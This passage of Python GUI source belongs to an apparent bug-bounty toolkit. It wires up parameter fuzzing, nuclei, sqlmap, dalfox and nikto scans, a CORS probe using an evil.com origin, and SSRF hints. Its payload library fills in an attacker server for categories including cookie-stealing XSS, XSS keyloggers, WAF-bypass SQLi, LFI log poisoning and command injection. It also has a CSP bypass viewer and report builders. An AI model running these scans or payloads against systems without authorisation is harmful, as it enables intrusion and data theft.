        ]
        def _go():
            self.root.after(0, lambda: self.url_term.log(f"[*] Param fuzzing: {url}", 'info'))
            found = []
            base = url.split('?')[0]
            try:
                # Baseline request
                req0 = urllib.request.Request(base, headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req0, timeout=8) as r0:
                    base_len = len(r0.read())
            except Exception as e:
                self.root.after(0, lambda: self.url_term.log(f"[!] Baseline error: {e}", 'err'))
                return
            for param in COMMON_PARAMS:
                try:
                    test_url = f"{base}?{param}=TEAMCYBEROPS_FUZZ"
                    req = urllib.request.Request(test_url, headers={"User-Agent":"Mozilla/5.0"})
                    with urllib.request.urlopen(req, timeout=5) as r:
                        body = r.read()
                        # Different length = param reflected or processed
                        if abs(len(body) - base_len) > 10 or b"TEAMCYBEROPS_FUZZ" in body:
                            found.append(param)
                            self.root.after(0, lambda p=param: self.url_term.log(f"  [+] Found param: {p}", 'ok'))
                except Exception:
                    pass
            def _done():
                if found:
                    self.url_term.log(f"\n[✓] Found {len(found)} params: {', '.join(found)}", 'ok')
                else:
                    self.url_term.log("[*] No params found with basic fuzzing", 'info')
                self.url_term.log("\nFor deep discovery: pip3 install arjun --break-system-packages", 'info')
            self.root.after(0, _done)
        threading.Thread(target=_go, daemon=True).start()

    def _run_gf_pattern(self, pattern):
        f = filedialog.askopenfilename(title=f"Select URL file for GF {pattern}", filetypes=[("Text","*.txt"),("All","*.*")])
        if not f: return
        if IS_WINDOWS:
            # On Windows, gf reads from file directly or use PowerShell
            cmd = ["gf", pattern, f] if shutil.which("gf") else ["powershell", "-Command", f"Get-Content '{f}' | gf {pattern}"]
        else:
            cmd = shell_cmd(f"cat '{f}' | gf {pattern}")
        self.url_term.run_command(cmd, label=f"GF {pattern}")

    def _run_gf_xss(self):   self._run_gf_pattern("xss")
    def _run_gf_sqli(self):  self._run_gf_pattern("sqli")
    def _run_gf_ssrf(self):  self._run_gf_pattern("ssrf")
    def _run_gf_idor(self):  self._run_gf_pattern("idor")

    def _run_kxss(self):
        f = filedialog.askopenfilename(title="Select URL file for KXSS", filetypes=[("Text","*.txt"),("All","*.*")])
        if not f: return
        if IS_WINDOWS:
            cmd = shell_cmd(f"type '{f}' | kxss")
        else:
            cmd = shell_cmd(f"cat '{f}' | kxss")
        self.url_term.run_command(cmd, label="KXSS reflected param finder")

    # Helper to register tool output into Results tab
    def after_tool(self, output_file, category, tool_name):
        """Called after a tool runs to register result file."""
        def _register():
            import time; time.sleep(3)
            if os.path.isfile(output_file):
                with open(output_file) as f:
                    lines = [l.strip() for l in f if l.strip()]
                if lines:
                    entry = {
                        "tool": tool_name, "category": category,
                        "file": output_file, "count": len(lines),
                        "project": self.project.get(),
                        "timestamp": datetime.now().isoformat()
                    }
                    self._save_result_entry(entry)
                    self._refresh_results()
        threading.Thread(target=_register, daemon=True).start()

    def _save_result_entry(self, entry):
        results_db = DB_DIR/"results.json"
        try:
            if results_db.exists():
                with open(results_db) as f: data = json.load(f)
            else:
                data = {"results": []}
            data["results"].append(entry)
            with open(results_db,"w") as f: json.dump(data, f, indent=2)
        except Exception: pass

    # ═════════════════════════════════════════════════════════════
    #  VULN SCANNER
    # ═════════════════════════════════════════════════════════════
    def _build_vuln(self, frame):
        frame.configure(bg=BG2)
        paned = tk.PanedWindow(frame, orient='vertical', bg=BG, sashwidth=5, sashrelief='flat')
        paned.pack(fill='both', expand=True)
        top = mk_frame(paned, bg=BG2); paned.add(top, stretch='always')
        pad = mk_frame(top, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)

        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,10))
        tk.Label(tr, text="TARGET URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(tr, var=self.vuln_target, w=50).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "← Project", lambda: self.vuln_target.set(
            f"https://{self.project.get()}" if self.project.get() else ""), FG3, small=True).pack(side='left')

        nr = mk_frame(pad, bg=BG2); nr.pack(fill='x', pady=(0,8))
        tk.Label(nr, text="SEVERITY:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        sev_opts = ["critical","high","medium,high,critical","low,medium,high,critical","info"]
        ttk.Combobox(nr, textvariable=self.nuclei_sev, values=sev_opts, width=28, font=MONO_S).pack(side='left', padx=8)
        tk.Label(nr, text="RATE:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(8,4))
        mk_entry(nr, var=self.nuclei_rate, w=6).pack(side='left')

        nb_f = mk_frame(pad, bg=BG2); nb_f.pack(fill='x', pady=(0,12))
        for txt, cmd, clr in [
            ("▶ Nuclei Full",  self._run_nuclei,        GREEN),
            ("▶ CVEs Only",   self._run_nuclei_cves,   CYAN),
            ("▶ Misconfigs",  self._run_nuclei_misconfig,YELLOW),
            ("▶ Tech Detect", self._run_nuclei_tech,   FG2),
        ]:
            mk_btn(nb_f, txt, cmd, clr, small=True).pack(side='left', padx=4)

        mk_section(pad, "SQLMAP OPTIONS", "💾").pack(fill='x', pady=(0,6))
        sf2 = mk_frame(pad, bg=BG2); sf2.pack(fill='x', pady=(0,10))
        for lbl, var, w in [("POST Data:", self.sqlmap_data, 28), ("Cookie:", self.sqlmap_cookie, 28),
                              ("Level:", self.sqlmap_level, 4),     ("Risk:", self.sqlmap_risk, 4)]:
            tk.Label(sf2, text=lbl, bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(6,2))
            mk_entry(sf2, var=var, w=w).pack(side='left', padx=(0,6), ipady=3)

        mk_section(pad, "VULNERABILITY TOOLS", "⚡").pack(fill='x', pady=(0,8))
        tg = mk_frame(pad, bg=BG2); tg.pack(fill='x')
        items = [
            ("🦊","Dalfox XSS",   "XSS scanner+exploit",  self._run_dalfox,  "dalfox"),
            ("💾","SQLMap",        "SQL injection",         self._run_sqlmap,  "sqlmap"),
            ("🔗","CORS Check",    "CORS misconfig",        self._run_cors,    None),
            ("📡","SSRF Probes",   "SSRF payload hints",    self._run_ssrf,    None),
            ("🔒","Nikto",         "Web server scan",       self._run_nikto,   "nikto"),
            ("📝","Manual Notes",  "Test notepad",          self._run_manual,  None),
        ]
        for i,(ico,name,desc,cmd,bn) in enumerate(items):
            ok = shutil.which(bn) is not None if bn else True
            c = mk_card(tg); c.grid(row=0, column=i, padx=5, pady=5, sticky='nsew')
            tg.columnconfigure(i, weight=1)
            tk.Label(c, text=ico, bg=BG3, font=('Consolas',18)).pack(pady=(12,2))
            tk.Label(c, text=name, bg=BG3, fg=FG, font=MONO_B).pack()
            tk.Label(c, text=desc, bg=BG3, fg=FG3, font=(_MONO_FACE,8)).pack(pady=2)
            tk.Label(c, text="● Ready" if ok else "○ Install", bg=BG3,
                     fg=GREEN if ok else RED, font=(_MONO_FACE,8)).pack(pady=2)
            mk_btn(c, "▶ RUN", cmd, ACCENT, small=True).pack(pady=(4,12))

        self.vuln_term = Terminal(paned, height=12, title="VULN SCANNER TERMINAL")
        paned.add(self.vuln_term)
        self.vuln_term.log("[*] Vulnerability scanner ready", 'info')

    def _run_nuclei(self):
        t = self._get_target(self.vuln_target)
        if not t: return
        out = str(LOGS_DIR/f"nuclei_{datetime.now().strftime('%H%M%S')}.json")
        cmd = vuln_scanner.build_cmd_nuclei(target=t, severity=self.nuclei_sev.get(),
                                             rate=self.nuclei_rate.get(), output_file=out)
        self.run_with_audit(self.vuln_term, cmd, label=f"Nuclei → {t}")

    def _run_nuclei_cves(self):
        t = self._get_target(self.vuln_target)
        if not t: return
        self.vuln_term.run_command(vuln_scanner.build_cmd_nuclei_cves(t), label=f"Nuclei CVEs → {t}")

    def _run_nuclei_misconfig(self):
        t = self._get_target(self.vuln_target)
        if not t: return
        cmd = ["nuclei","-u",t,"-t","misconfiguration/","-t","exposures/","-severity","medium,high,critical","-silent"]
        self.vuln_term.run_command(cmd, label=f"Nuclei Misconfig → {t}")

    def _run_nuclei_tech(self):
        t = self._get_target(self.vuln_target)
        if not t: return
        self.vuln_term.run_command(["nuclei","-u",t,"-t","technologies/","-silent"], label=f"Nuclei Tech → {t}")

    def _run_dalfox(self):
        t = self._get_target(self.vuln_target)
        if not t: return
        self.vuln_term.run_command(vuln_scanner.build_cmd_dalfox(t), label=f"Dalfox → {t}")

    def _run_sqlmap(self):
        t = self._get_target(self.vuln_target)
        if not t: return
        cmd = vuln_scanner.build_cmd_sqlmap(t, data=self.sqlmap_data.get(),
                                             cookies=self.sqlmap_cookie.get(),
                                             level=self.sqlmap_level.get(), risk=self.sqlmap_risk.get())
        self.vuln_term.run_command(cmd, label=f"SQLMap → {t}")

    def _run_cors(self):
        t = self._get_target(self.vuln_target)
        if not t: return
        self.vuln_term.log(f"[*] CORS check on {t}", 'info')
        def _go():
            import urllib.request
            try:
                req = urllib.request.Request(t, headers={'Origin':'https://evil.com','Access-Control-Request-Method':'GET'})
                r = urllib.request.urlopen(req, timeout=10)
                h = dict(r.getheaders())
                acao = h.get('Access-Control-Allow-Origin','not set')
                acac = h.get('Access-Control-Allow-Credentials','not set')
                self.vuln_term.log(f"[CORS] ACAO: {acao}", 'ok')
                self.vuln_term.log(f"[CORS] ACAC: {acac}", 'ok')
                if acao in ('*','https://evil.com'):
                    self.vuln_term.log("[VULNERABLE] CORS misconfiguration found!", 'err')
                else:
                    self.vuln_term.log("[OK] CORS appears fine", 'ok')
            except Exception as e:
                self.vuln_term.log(f"[ERROR] {e}", 'err')
        threading.Thread(target=_go, daemon=True).start()

    def _run_ssrf(self):
        t = self._get_target(self.vuln_target)
        if not t: return
        self.vuln_term.log(f"[*] SSRF payload suggestions for: {t}", 'info')
        for p in SSRF_PAYLOADS[:12]: self.vuln_term.log(f"    {p}", 'normal')
        self.vuln_term.log("[!] Test manually via Burp or use interactsh OOB server", 'warn')

    def _run_nikto(self):
        t = self._get_target(self.vuln_target)
        if not t: return
        self.vuln_term.run_command(vuln_scanner.build_cmd_nikto(t), label=f"Nikto → {t}")

    def _run_manual(self):
        win = tk.Toplevel(self.root); win.title("Manual Test Notes")
        win.configure(bg=BG); win.geometry("680x500")
        tk.Frame(win, bg=ACCENT, height=2).pack(fill='x')
        tk.Label(win, text="MANUAL TEST NOTES", bg=BG, fg=ACCENT, font=MONO_B).pack(pady=8)
        txt = mk_stext(win, h=24, bg=BG3, fg=FG); txt.pack(fill='both', expand=True, padx=12)
        txt.insert('end', f"# Manual Test Notes\n# Target: {self.vuln_target.get()}\n# Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n")
        mk_btn(win, "💾 Save", lambda: self._save_text(txt.get('1.0','end')), GREEN, small=True).pack(pady=8)

    # ═════════════════════════════════════════════════════════════
    #  EXPLOITATION
    # ═════════════════════════════════════════════════════════════
    def _build_exploit(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        pf = tk.Frame(nb2, bg=BG2); nb2.add(pf, text="  💣 Payload Library  ")
        cf = tk.Frame(nb2, bg=BG2); nb2.add(cf, text="  🛡 CSP Analyzer  ")
        bf = tk.Frame(nb2, bg=BG2); nb2.add(bf, text="  📄 PoC Builder  ")
        self._build_payload_browser(pf)
        self._build_csp_analyzer(cf)
        self._build_poc_builder(bf)

    def _build_payload_browser(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        from modules.exploit.payloads import PAYLOAD_CATALOG, count_mega_payloads
        # Merge mega catalog + original small lists
        CATS = dict(PAYLOAD_CATALOG)
        CATS.update({
            "XSS Basic": XSS_BASIC, "XSS Encoded": XSS_ENCODED, "XSS Cookie Steal": XSS_COOKIE_STEAL,
            "XSS DOM": XSS_DOM_BASED, "XSS Keylogger": XSS_KEYLOGGER,
            "SQLi Basic": SQLI_BASIC, "SQLi Blind": SQLI_BLIND, "SQLi Union": SQLI_UNION,
            "SQLi Error": SQLI_ERROR_BASED, "SQLi WAF Bypass": SQLI_BYPASS_WAF,
            "SSRF Basic": SSRF_PAYLOADS, "SSRF Advanced": SSRF_ADVANCED, "SSRF Bypass": SSRF_BYPASS,
            "LFI Basic": LFI_PAYLOADS, "LFI PHP Wrappers": LFI_PHP_WRAPPER, "LFI Log Poison": LFI_LOG_POISON,
            "SSTI Detect": SSTI_PAYLOADS, "SSTI Jinja2": SSTI_JINJA2, "SSTI Django": SSTI_DJANGO,
            "XXE Basic": XXE_PAYLOADS, "XXE Blind": XXE_BLIND,
            "CMD Inject": CMD_INJECT, "CMD Bypass": CMD_INJECT_BYPASS,
            "Open Redirect": OPEN_REDIRECT, "CORS Bypass": CORS_BYPASS, "LDAP Inject": LDAP_INJECT,
        })
        self._pl_cats = CATS
        cr = mk_frame(pad, bg=BG2); cr.pack(fill='x', pady=(0,10))
        tk.Label(cr, text="CATEGORY:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        cat_box = ttk.Combobox(cr, textvariable=self.payload_cat, values=list(CATS.keys()), width=22, font=MONO_S)
        cat_box.pack(side='left', padx=8)
        tk.Label(cr, text="YOUR SERVER:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(16,4))
        mk_entry(cr, var=self.attacker_ip, w=28).pack(side='left')
        self._pl_count_lbl = tk.Label(cr, text="", bg=BG2, fg=ACCENT, font=MONO_B)
        self._pl_count_lbl.pack(side='right', padx=8)
        self._pl_txt = mk_stext(pad, h=24); self._pl_txt.pack(fill='both', expand=True, pady=(0,8))
        bf2 = mk_frame(pad, bg=BG2); bf2.pack(fill='x')
        def copy_all():
            self.root.clipboard_clear(); self.root.clipboard_append(self._pl_txt.get('1.0','end'))
            self.set_status("All payloads copied!", GREEN)
        def save_all(): self._save_text(self._pl_txt.get('1.0','end'))
        mk_btn(bf2, "📋 Copy All", copy_all, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf2, "💾 Save File", save_all, FG2, small=True).pack(side='left', padx=4)
        def load_payloads(*_):
            cat = self.payload_cat.get(); items = CATS.get(cat, [])
            att = self.attacker_ip.get()
            self._pl_txt.config(state='normal'); self._pl_txt.delete('1.0','end')
            for i, p in enumerate(items, 1):
                line = p.replace("ATTACKER", att) if isinstance(p, str) else str(p)
                self._pl_txt.insert('end', f"{i:02d}.  {line}\n")
            self._pl_txt.config(state='disabled')
            self._pl_count_lbl.config(text=f"{len(items)} payloads")
        cat_box.bind("<<ComboboxSelected>>", load_payloads)
        self.attacker_ip.trace_add('write', load_payloads)
        load_payloads()

    def _build_csp_analyzer(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "CSP HEADER ANALYZER", "🛡").pack(fill='x', pady=(0,10))

        # URL auto-fetch row
        url_f = mk_frame(pad, bg=BG2); url_f.pack(fill='x', pady=(0,6))
        tk.Label(url_f, text="Fetch from URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._csp_url_var = tk.StringVar()
        mk_entry(url_f, var=self._csp_url_var, w=50).pack(side='left', padx=8, ipady=3)
        mk_btn(url_f, "← Project", lambda: self._csp_url_var.set(
            f"https://{self.project.get()}"), FG3, small=True).pack(side='left')
        mk_btn(url_f, "🌐 Fetch & Analyze", self._csp_fetch_and_analyze, CYAN, small=True).pack(side='left', padx=8)

        # Manual paste row
        hr = mk_frame(pad, bg=BG2); hr.pack(fill='x', pady=(0,8))
        tk.Label(hr, text="Or paste CSP:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(hr, var=self.csp_input, w=62).pack(side='left', padx=8, ipady=3)
        mk_btn(hr, "🔍 Analyze", self._analyze_csp, ACCENT, small=True).pack(side='left')

        self._csp_result = mk_stext(pad, h=12, bg=BG3, fg=FG)
        self._csp_result.pack(fill='x', pady=(0,12))
        mk_section(pad, "BYPASS PAYLOADS", "💣").pack(fill='x', pady=(0,8))
        bg_f = mk_frame(pad, bg=BG2); bg_f.pack(fill='x', pady=(0,10))
        for bp in CSP_BYPASSES.keys():
            mk_btn(bg_f, bp, lambda t=bp: self._show_csp_bypass(t), PURPLE, small=True).pack(side='left', padx=3, pady=2)
        self._csp_bypass_txt = mk_stext(pad, h=12, bg=BG3, fg=FG)
        self._csp_bypass_txt.pack(fill='both', expand=True)

    def _csp_fetch_and_analyze(self):
        url = self._csp_url_var.get().strip()
        if not url: return
        if not url.startswith('http'): url = 'https://' + url
        self.set_status(f"Fetching headers from {url}...", CYAN)
        def _go():
            try:
                import urllib.request as _ur
                req = _ur.Request(url, headers={'User-Agent':'Mozilla/5.0'})
                with _ur.urlopen(req, timeout=10) as r:
                    hdrs = dict(r.getheaders())
                csp = hdrs.get('Content-Security-Policy','') or hdrs.get('content-security-policy','')
                all_security = {k: v for k, v in hdrs.items() if any(
                    x in k.lower() for x in ['security','content-security','x-frame','x-content',
                                              'strict-transport','referrer','permissions','x-xss'])}
                def _upd():
                    self._csp_result.config(state='normal')
                    self._csp_result.delete('1.0','end')
                    self._csp_result.insert('end', f"=== SECURITY HEADERS FROM {url} ===\n\n")
                    for k, v in all_security.items():
                        self._csp_result.insert('end', f"  {k}: {v}\n")
                    if csp:
                        self.csp_input.set(csp)
                        self._csp_result.insert('end', f"\n=== CSP ANALYSIS ===\n\n")
                        result = analyze_csp(csp)
                        for issue in result["issues"]:
                            self._csp_result.insert('end', f"  {issue}\n")
                        if result["bypass_suggestions"]:
                            self._csp_result.insert('end', "\n=== BYPASS SUGGESTIONS ===\n\n")
                            for b in result["bypass_suggestions"]:
                                self._csp_result.insert('end', f"  {b}\n")
                    else:
                        self._csp_result.insert('end', "\n⚠  No CSP header found on this URL!\n")
                        self._csp_result.insert('end', "This means XSS attacks are NOT restricted by CSP.\n")
                    self._csp_result.config(state='disabled')
                    self.set_status(f"Headers fetched: {'CSP found' if csp else 'No CSP!'}", GREEN if csp else YELLOW)
                self.root.after(0, _upd)
            except Exception as e:
                self.root.after(0, lambda: self.set_status(f"Fetch error: {e}", RED))
        threading.Thread(target=_go, daemon=True).start()

    def _analyze_csp(self):
        csp = self.csp_input.get()
        if not csp: messagebox.showwarning("Empty","Paste a CSP header first!", parent=self.root); return
        result = analyze_csp(csp)
        self._csp_result.config(state='normal'); self._csp_result.delete('1.0','end')
        self._csp_result.insert('end', "═══ CSP ANALYSIS ═══\n\n")
        for issue in result["issues"]: self._csp_result.insert('end', f"  {issue}\n")
        if result["bypass_suggestions"]:
            self._csp_result.insert('end', "\n═══ BYPASS SUGGESTIONS ═══\n\n")
            for b in result["bypass_suggestions"]: self._csp_result.insert('end', f"  {b}\n")
        self._csp_result.config(state='disabled')

    def _show_csp_bypass(self, bp_type):
        bypasses = CSP_BYPASSES.get(bp_type, [])
        self._csp_bypass_txt.config(state='normal'); self._csp_bypass_txt.delete('1.0','end')
        self._csp_bypass_txt.insert('end', f"═══ {bp_type.upper()} ═══\n\n")
        for b in bypasses: self._csp_bypass_txt.insert('end', f"  {b}\n\n")
        self._csp_bypass_txt.config(state='disabled')

    def _build_poc_builder(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "POC BUILDER — SAVE AS FINDING", "📄").pack(fill='x', pady=(0,10))
        fg2 = mk_frame(pad, bg=BG2); fg2.pack(fill='x', pady=(0,8))
        fields = [("Title:", self.poc_title, 50),("Affected URL:", self.poc_url, 50),
                  ("Vuln Type:", self.poc_type, 30),("Severity:", self.poc_sev, 12),
                  ("CVSS Score:", self.poc_cvss, 8),("CVSS Vector:", self.poc_vector, 42)]
        for i,(lbl,var,w) in enumerate(fields):
            r, c = divmod(i,2)
            tk.Label(fg2, text=lbl, bg=BG2, fg=FG3, font=MONO_S, width=14, anchor='e').grid(row=r, column=c*2, sticky='e', padx=(8,4), pady=4)
            mk_entry(fg2, var=var, w=w).grid(row=r, column=c*2+1, sticky='w', padx=(0,16), pady=4, ipady=3)
        fg2.columnconfigure(1, weight=1); fg2.columnconfigure(3, weight=1)
        sev_f = mk_frame(pad, bg=BG2); sev_f.pack(fill='x', pady=(0,6))
        tk.Label(sev_f, text="Quick Set:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
            mk_btn(sev_f, sev, lambda s=sev: self.poc_sev.set(s), SEV_COLOR(sev), small=True).pack(side='left', padx=3)
        for lbl, attr_name, h in [
            ("Description:", "_poc_desc", 3),
            ("Steps to Reproduce (PoC):", "_poc_steps", 5),
            ("Impact:", "_poc_impact", 3)
        ]:
            tk.Label(pad, text=lbl, bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(8,3))
            txt = mk_stext(pad, h=h, bg=BG3, fg=FG); txt.pack(fill='x')
            setattr(self, attr_name, txt)
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(10,0))
        self._ss_lbl = tk.Label(bf, text="No screenshot attached", bg=BG2, fg=FG3, font=MONO_S)
        mk_btn(bf, "📸 Attach Screenshot", self._attach_screenshot, FG2, small=True).pack(side='left', padx=4)
        self._ss_lbl.pack(side='left', padx=8)
        mk_btn(bf, "💾 Save Finding", self._save_poc, GREEN).pack(side='right', padx=4)
        mk_btn(bf, "🔴 HackerOne", self._export_h1, RED, small=True).pack(side='right', padx=4)
        mk_btn(bf, "🟡 Bugcrowd", self._export_bugcrowd, YELLOW, small=True).pack(side='right', padx=4)

    def _attach_screenshot(self):
        p = filedialog.askopenfilename(filetypes=[("Images","*.png *.jpg *.jpeg *.gif"),("All","*.*")])
        if p:
            self.screenshot_path = p
            if self._ss_lbl: self._ss_lbl.config(text=f"📸 {Path(p).name}", fg=GREEN)

    def _save_poc(self):
        finding = {
            "title": self.poc_title.get(), "url": self.poc_url.get(),
            "type": self.poc_type.get(), "severity": self.poc_sev.get().upper(),
            "cvss_score": self.poc_cvss.get(), "cvss_vector": self.poc_vector.get(),
            "description": self._poc_desc.get('1.0','end').strip() if self._poc_desc else "",
            "poc": self._poc_steps.get('1.0','end').strip() if self._poc_steps else "",
            "impact": self._poc_impact.get('1.0','end').strip() if self._poc_impact else "",
            "screenshot": self.screenshot_path,
            "project": self.project.get(), "tool": "Manual",
            "status": "Open", "user": self.user.get('username','')
        }
        if not finding["title"]:
            messagebox.showerror("Error","Title is required!", parent=self.root); return
        save_finding(finding)
        self.set_status(f"Finding saved: {finding['title']}", GREEN)
        messagebox.showinfo("Saved", f"✓ Finding '{finding['title']}' saved!", parent=self.root)
        self._refresh_findings()
        try:
            notifier.notify_all(
                f"🔴 [{finding['severity']}] {finding['title']}\nURL: {finding['url']}",
                f"TeamCyberOps — New {finding['severity']} Finding")
        except Exception: pass

    def _export_h1(self):
        f = {k:getattr(self,f"poc_{k}",tk.StringVar()).get() if k!='poc' else (self._poc_steps.get('1.0','end').strip() if self._poc_steps else '') for k in ['title','url','type','sev','cvss','vector']}
        f2 = {"title":self.poc_title.get(),"url":self.poc_url.get(),"type":self.poc_type.get(),
               "severity":self.poc_sev.get(),"cvss_score":self.poc_cvss.get(),"cvss_vector":self.poc_vector.get(),
               "description":self._poc_desc.get('1.0','end').strip() if self._poc_desc else "",
               "poc":self._poc_steps.get('1.0','end').strip() if self._poc_steps else "",
               "impact":self._poc_impact.get('1.0','end').strip() if self._poc_impact else ""}
        from reporting.generator import generate_hackerone_report
        self._show_text("HackerOne Report", generate_hackerone_report(f2))

    def _export_bugcrowd(self):
        f2 = {"title":self.poc_title.get(),"url":self.poc_url.get(),"type":self.poc_type.get(),
               "severity":self.poc_sev.get(),"cvss_score":self.poc_cvss.get(),"cvss_vector":self.poc_vector.get(),
               "description":self._poc_desc.get('1.0','end').strip() if self._poc_desc else "",
               "poc":self._poc_steps.get('1.0','end').strip() if self._poc_steps else "",
               "impact":self._poc_impact.get('1.0','end').strip() if self._poc_impact else ""}
        from reporting.generator import generate_bugcrowd_report
        self._show_text("Bugcrowd Report", generate_bugcrowd_report(f2))

    # ═════════════════════════════════════════════════════════════
    #  FINDINGS
    # ═════════════════════════════════════════════════════════════
    def _build_findings(self, frame):
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=10)

        # ── Top controls ──────────────────────────────────────────
        top = mk_frame(pad, bg=BG2); top.pack(fill='x', pady=(0,8))

        # Search
        tk.Label(top, text="🔍", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._find_search_var = tk.StringVar()
        search_e = mk_entry(top, var=self._find_search_var, w=26)
        search_e.pack(side='left', padx=6, ipady=3)
        search_e.bind('<Return>', lambda e: self._refresh_findings())
        self._find_search_var.trace_add('write', lambda *_: self.root.after(300, self._refresh_findings))

        # Severity filter
        tk.Label(top, text="  Severity:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(8,4))
        for sev in ["All","CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
            clr = SEV_COLOR(sev) if sev != "All" else FG2
            ttk.Radiobutton(top, text=sev, variable=self.findings_filter, value=sev,
                           command=self._refresh_findings).pack(side='left', padx=4)

        # Stats labels
        self._find_stats_lbl = tk.Label(top, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._find_stats_lbl.pack(side='left', padx=12)

        # Buttons
        mk_btn(top, "🔄 Refresh",    self._refresh_findings,                  FG3,   small=True).pack(side='right', padx=2)
        mk_btn(top, "📊 Export CSV", self._export_csv,                        CYAN,  small=True).pack(side='right', padx=2)
        mk_btn(top, "🗑 Delete",     self._delete_selected_finding,           RED,   small=True).pack(side='right', padx=2)
        mk_btn(top, "+ Add Finding", self._show_add_finding_dialog,           GREEN, small=True).pack(side='right', padx=2)

        # Status filter
        r2 = mk_frame(pad, bg=BG2); r2.pack(fill='x', pady=(0,8))
        tk.Label(r2, text="Status:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._find_status_var = tk.StringVar(value="All")
        for st in ["All","Open","In Progress","Reported","Duplicate","Not a Bug","Resolved"]:
            ttk.Radiobutton(r2, text=st, variable=self._find_status_var, value=st, command=self._refresh_findings).pack(side='left', padx=6)

        # ── Tree ──────────────────────────────────────────────────
        cols = ('ID','Project','Title','Type','Severity','CVSS','URL','Status','Date')
        self._findings_tree = mk_tree(pad, columns=cols, show='headings', height=22)
        wsz = {'ID':80,'Project':100,'Title':240,'Type':100,
               'Severity':75,'CVSS':55,'URL':220,'Status':90,'Date':90}
        for c in cols:
            self._findings_tree.heading(c, text=c,
                command=lambda _c=c: self._sort_findings(_c), anchor='w')
            self._findings_tree.column(c, width=wsz.get(c,100), anchor='w')

        for sev in ('CRITICAL','HIGH','MEDIUM','LOW','INFO'):
            self._findings_tree.tag_configure(sev,
                foreground=SEV_COLOR(sev), background=SEV_BG(sev))

        vsb = ttk.Scrollbar(pad, orient='vertical',   command=self._findings_tree.yview)
        hsb = ttk.Scrollbar(pad, orient='horizontal', command=self._findings_tree.xview)
        self._findings_tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._findings_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)
        hsb.pack(side='bottom', fill='x')

        self._findings_tree.bind('<Double-1>', self._finding_detail)
        self._findings_tree.bind('<Return>',   self._finding_detail)
        self._findings_tree.bind('<Delete>',   lambda e: self._delete_selected_finding())

        # Store all findings for reference
        self._all_findings_data = []
        self._sort_col   = 'Date'
        self._sort_rev   = True
        self._refresh_findings()

    def _refresh_findings(self):
        if not self._findings_tree:
            return
        try:
            filt    = self.findings_filter.get() if hasattr(self, 'findings_filter') else "All"
            status  = self._find_status_var.get() if hasattr(self, '_find_status_var') else "All"
            search  = self._find_search_var.get().strip().lower() if hasattr(self, '_find_search_var') else ""

            # Load ALL findings — no project filter
            findings = load_findings()
            self._all_findings_data = findings

            # Apply filters
            if filt != "All":
                findings = [f for f in findings if f.get('severity','INFO').upper() == filt]
            if status != "All":
                findings = [f for f in findings if f.get('status','Open') == status]
            if search:
                findings = [f for f in findings
                            if search in f.get('title','').lower()
                            or search in f.get('url','').lower()
                            or search in f.get('type','').lower()
                            or search in f.get('project','').lower()
                            or search in f.get('description','').lower()]

            # Sort
            col = getattr(self, '_sort_col', 'Date')
            rev = getattr(self, '_sort_rev', True)
            key_map = {
                'ID': lambda x: x.get('id',''),
                'Project': lambda x: x.get('project',''),
                'Title': lambda x: x.get('title',''),
                'Type': lambda x: x.get('type',''),
                'Severity': lambda x: {'CRITICAL':0,'HIGH':1,'MEDIUM':2,'LOW':3,'INFO':4}.get(x.get('severity','INFO').upper(), 5),
                'CVSS': lambda x: float(x.get('cvss_score',0) or 0),
                'Status': lambda x: x.get('status',''),
                'Date': lambda x: x.get('timestamp',''),
            }
            findings.sort(key=key_map.get(col, lambda x: x.get('timestamp','')), reverse=rev)

            self._findings_tree.delete(*self._findings_tree.get_children())
            inserted = 0
            for f in findings:
                sev    = f.get('severity','INFO').upper()
                # Use the actual finding ID as iid for easy lookup
                fid    = str(f.get('id',''))
                # Ensure unique iid
                iid    = f"fid_{fid}_{inserted}"
                try:
                    self._findings_tree.insert('', 'end', iid=iid, values=(
                        fid,
                        f.get('project','')[:20],
                        f.get('title','')[:60],
                        f.get('type','')[:20],
                        sev,
                        f.get('cvss_score',''),
                        f.get('url','')[:55],
                        f.get('status','Open'),
                        str(f.get('timestamp',''))[:10]
                    ), tags=(sev,))
                    # Ensure row is visible with explicit foreground
                    self._findings_tree.tag_configure(sev,
                        foreground=SEV_COLOR(sev),
                        background=SEV_BG(sev))
                    inserted += 1
                except Exception:
                    pass

            # Stats
            total = len(load_findings())
            crits = sum(1 for f in load_findings() if f.get('severity','').upper() == 'CRITICAL')
